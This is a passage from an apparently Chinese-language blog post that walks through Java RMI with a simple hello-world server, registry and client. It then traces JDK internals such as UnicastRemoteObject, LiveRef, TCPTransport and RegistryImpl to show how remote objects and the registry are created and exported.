<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Amzf3">服务端</h3>
服务端需要去把这个接口实现，因为最后调用的是服务端的代码

<p><strong>RemoteObjlmpl</strong>这个类在定义的时候有要求，需要<strong>继承UnicastRemoteObject</strong>这个类（如果你想把这个绑定到RMIRegistry中，就需要去继承它）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjlmpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span>  <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjlmpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在服务端代码中，首先我们需要去创建一个远程对象来保证通信，但是客户端并不知道这个端口是多少，所以需要一个注册中心<code>RMIregistry</code>，它是有固定端口的，一般是1099，最后把注册中心绑定到远程对象上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="moZIX">客户端</h3>
客户端获取注册中心（ip和端口都是固定的），从注册中心中查找remoteObj远程对象，然后去调用他的方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735189589676-11914c58-3e0d-4819-b17c-beab7148acfc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735189589676-11914c58-3e0d-4819-b17c-beab7148acfc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><strong>在这通信过程中，通过网络操作去实现一个内存操作，这里面有一个对象的创建和调用过程，这里面全是通过序列化和反序列化实现的</strong></p>
<h2 id="pV36o">源码层面分析</h2>
<h3 id="okKpD">创建远程服务</h3>
创建远程服务代码如下，我们动态调试来看一下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjlmpl</span>();</span><br></pre></td></tr></table></figure>

<p>首先会调用RemoteObjImpl的构造方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565514276-4c11398f-1929-4a82-b2bf-eaa899fbf245.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565514276-4c11398f-1929-4a82-b2bf-eaa899fbf245.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>由于这个类继承于<code>UnicastRemoteObject</code>，使用会调用父类的无参构造</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565708214-b45272c2-f817-47a9-8a74-35857154a033.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565708214-b45272c2-f817-47a9-8a74-35857154a033.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在其父类的构造方法中，会将默认port设置为0（后续会随机设置一个端口）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后会有一系列的赋值，我们就不细看了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565940179-933b8f8f-c47b-44e5-a916-6f90a408c6ec.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735565940179-933b8f8f-c47b-44e5-a916-6f90a408c6ec.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在其构造方法中，会调用<code>exportObject</code>，它的名字就是”导出对象“，很明显是我们的核心函数</p>
<p>其中，它创建了一个<code>UnicastServerRef</code>，”服务端引用“，其中传入了一个端口，前面这个obj，很明显是我们用来实现逻辑的，而后面这个对象，就是我们用来处理网络请求的了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在UnicastServerRef的构造函数中，创建了一个<code>LiveRef</code>类（非常重要的一个类），将port传入其构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>（其中传入的一个ObjID我们就不多说了）其中<code>TCPEndpoint</code>的构造函数（一个IP，一个端口），很明显就是用来处理网络请求的</p>
<p>在<code>LiveRef</code>中，存着endpoint，objID与isLocal</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>((<span class="keyword">new</span> <span class="title class_">ObjID</span>()), port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(objID, TCPEndpoint.getLocalEndpoint(port), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(ObjID objID, Endpoint endpoint, <span class="type">boolean</span> isLocal)</span> &#123;</span><br><span class="line">        ep = endpoint;</span><br><span class="line">        id = objID;</span><br><span class="line">        <span class="built_in">this</span>.isLocal = isLocal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TCPEndpoint</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TCPEndpoint</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(host, port, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中ep存入的东西如下（目前port为0），后面我们会说到，transport才是真正处理网络请求的东西，外面的每一层都是对它的封装</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735566671831-806caa47-7896-4881-9675-6181331c8b1f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735566671831-806caa47-7896-4881-9675-6181331c8b1f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这样<code>LiveRef</code>就创建好了，然后会调用它父类的构造函数</p>
<p>在其父类的构造函数，也是简单赋了值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">        ref = liveRef;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>返回回去，我们进入<code>exportObject</code>方法，在sref中，封装着LiveRef</p>
<p>在这段中，就是一直在不同的类中调用<code>exportObject</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">            ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735567219818-51af68bc-1e60-4d7d-af0f-1eccc556f56e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735567219818-51af68bc-1e60-4d7d-af0f-1eccc556f56e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入sref中的<code>exportObject</code>方法，在这里创建了代理stub</p>
<p>那么有人问了，我这里不是服务端吗，为什么会创建客户端的stub呢？</p>
<p>这里是因为，是服务端创建stub，将stub放在注册中心，客户端去注册中心拿到stub，然后用stub去操作skeleton</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                               <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; implClass = impl.getClass();</span><br><span class="line">        Remote stub;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            setSkeleton(impl);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">        ref.exportObject(target);</span><br><span class="line">        hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line">        <span class="keyword">return</span> stub;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看看createProxy中的逻辑,其中implClass中放的是远程对象的类，clientRef中放着LiveRef</p>
<p>其中有一个判断，forceStubUse和ignoreStubClasses咱们暂时不解释它，看一下stubClassExists中的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568100492-4a264e10-6dcd-456e-a822-2ee1a55cb777.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568100492-4a264e10-6dcd-456e-a822-2ee1a55cb777.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>它判断，如果存在	远程类的名字+ “_Stub”	这个类，他就会走进去</p>
<p>实际上JDK中有一些类是已经定义好的（现在我们先过，后面会说）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568394438-93713b2f-ad56-4283-a1a4-a770781f8d0e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568394438-93713b2f-ad56-4283-a1a4-a770781f8d0e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>还是在这个类中，接下来就会创建动态代理，经过些，动态代理就已经创建好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                       interfaces,</span><br><span class="line">                                                       handler);</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>tip:在创建代理过程中的几个参数如下</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568717699-3035db44-e998-4adb-8ccc-9b0b0816a485.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735568717699-3035db44-e998-4adb-8ccc-9b0b0816a485.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>若上述过程中，存在这么一个系统内置的stub类，就会进入下面的if当中（后续讨论）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            setSkeleton(impl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>创建完成后，会将当前有用的信息封装进入，就是一个总封装（其中封装的信息如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735569232927-dca9e42f-96e1-4645-91a6-926be85cbf90.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735569232927-dca9e42f-96e1-4645-91a6-926be85cbf90.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来就把我们封装的东西发布出去（使用exportObject函数），我们进入看一下它的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ref.exportObject(target);</span><br></pre></td></tr></table></figure>

<p>这里会层层调用exportObject函数，最终走到了TCPTransport的exportObject，这里是最终处理网络请求的地方，在TCPTransport#exportObject会调用listen函数，这里就会开放端口，我们跟进去看看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LiveRef#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        ep.exportObject(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TCPEndpoint#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        transport.exportObject(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TCPTransport#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Ensure that a server socket is listening, and count this</span></span><br><span class="line"><span class="comment">         * export while synchronized to prevent the server socket from</span></span><br><span class="line"><span class="comment">         * being closed due to concurrent unexports.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            listen();</span><br><span class="line">            exportCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Try to add the Target to the exported object table; keep</span></span><br><span class="line"><span class="comment">         * counting this export (to keep server socket open) only if</span></span><br><span class="line"><span class="comment">         * that succeeds.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">            ok = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    decrementExportCount();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>server = ep.newServerSocket();</code>构造了一个socket，创建一个线程后打开线程，等待别人来连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TCPTransport#listen</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> getEndpoint();</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> ep.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                tcpLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;(port &quot;</span> + port + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                server = ep.newServerSocket();</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Don&#x27;t retry ServerSocket if creation fails since</span></span><br><span class="line"><span class="comment">                 * &quot;port in use&quot; will cause export to hang if an</span></span><br><span class="line"><span class="comment">                 * RMIFailureHandler is not installed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(server),</span><br><span class="line">                                        <span class="string">&quot;TCP Accept-&quot;</span> + port, <span class="literal">true</span>));</span><br><span class="line">                t.start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.net.BindException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Port already in use: &quot;</span> + port, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Listen failed on port: &quot;</span> + port, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// otherwise verify security access to existing server socket</span></span><br><span class="line">            <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">                sm.checkListen(port);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在构造socket的过程中，如果说端口是0的话，就会随机设置一个端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (listenPort == <span class="number">0</span>)</span><br><span class="line">            setDefaultPort(server.getLocalPort(), csf, ssf);</span><br></pre></td></tr></table></figure>

<p>最后经过一系列返回，最后ObjectTable中，使用putTarget将target保存在了一个静态表objTable中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">objTable.put(oe, target);</span><br><span class="line">implTable.put(weakImpl, target);</span><br></pre></td></tr></table></figure>

<p>创建服务端的代码就走完了，最后等待连接</p>
<h3 id="ePUrT">创建注册中心+绑定</h3>
<h4 id="pWH6N">创建注册中心</h4>

<p><strong>tip：表面上注册中心和远程服务是不一样的东西，但是实际上是一样的东西</strong></p>
<p>创建注册中心代码如下，我们将1099默认端口传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>走进<code>createRegistry</code>方法中，该方法会创建<code>RegistryImpl</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看一下它的构造方法，首先开头的if判断是一个安全验证的东西，我们暂时不看，在下方else中，会创建<code>LiveRef</code>对象和<code>UnicastServerRef</code>对象，<code>UnicastServerRef</code>中放入<code>LiveRef</code>（和我们之看的创建远程服务很是类似）最后调用了一个<code>setup</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">            setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看看再setup方法中干了些什么</p>
<p>与注册远程服务时<code>UnicastRemoteObject#exportObject</code>相比，只有第三个参数由false变为了ture</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef uref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Server ref must be created and assigned before remote</span></span><br><span class="line"><span class="comment">         * object &#x27;this&#x27; can be exported.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ref = uref;</span><br><span class="line">        uref.exportObject(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UnicastRemoteObject#exportObject</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">            ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">        &#125;</span><br><span class="line">   